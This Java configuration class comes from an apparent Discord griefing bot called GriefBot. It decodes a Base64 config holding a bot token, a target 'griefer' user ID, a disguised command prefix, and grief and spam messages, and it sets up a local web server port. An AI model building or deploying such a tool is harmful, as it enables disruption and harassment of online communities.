package de.corruptedbytes.utils;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import org.json.JSONObject;

import de.corruptedbytes.GriefBot;

public class Config {
	
	public final static File WEB_DIRECTORY = new File("web/");
	public final static File CONFIG_FILE = new File("config.dgb");
	public final static File SERVER_FILE = new File("server.json");
	
	public static void initConfig() throws IOException {
		String configFileString = new String(Base64.getDecoder().decode(FileUtils.readFile(CONFIG_FILE)), StandardCharsets.UTF_8);

		JSONObject jsonObject = new JSONObject(configFileString);
		
		GriefBot.getInstance().setDiscordBotToken(jsonObject.getString("botToken"));
		GriefBot.getInstance().setGrieferUserID(jsonObject.getString("userID"));
		GriefBot.getInstance().setActivityDescription(jsonObject.getString("activityDescription"));
		GriefBot.getInstance().setDisguiseCommandPrefix(jsonObject.getString("disguiseCommandPrefix"));
		GriefBot.getInstance().setGriefMessage(jsonObject.getString("griefMessage"));
		GriefBot.getInstance().setSpamMessage(jsonObject.getString("spamMessage"));
		GriefBot.getInstance().setGriefPicture(jsonObject.getString("griefPicture"));
	}
	
	public static void initServerConfig() throws Exception {
		if (SERVER_FILE.exists()) {
			JSONObject jsonObject = new JSONObject(FileUtils.readFile(SERVER_FILE));
			GriefBot.getInstance().setWebServerPort(jsonObject.getInt("webServerPort"));
			exportWebFiles();
		} else {
			createServerConfig();
			initServerConfig();
		}
	}
	
	public static void exportWebFiles() throws Exception {
		if (!(WEB_DIRECTORY.exists() && WEB_DIRECTORY.isDirectory())) {
			WEB_DIRECTORY.mkdir();
			
			File zipFile = new File(WEB_DIRECTORY + "/web.zip");
			FileUtils.exportFile("web.zip", zipFile);
			FileUtils.extractZip(zipFile, WEB_DIRECTORY);
		}
	}
	
	private static void createServerConfig() throws IOException {
		JSONObject jsonObject = new JSONObject();
		jsonObject.put("webServerPort", 85);
		
		BufferedWriter writer = new BufferedWriter(new FileWriter(SERVER_FILE, false));
	    writer.write(jsonObject.toString());
	    writer.close();
	}
}
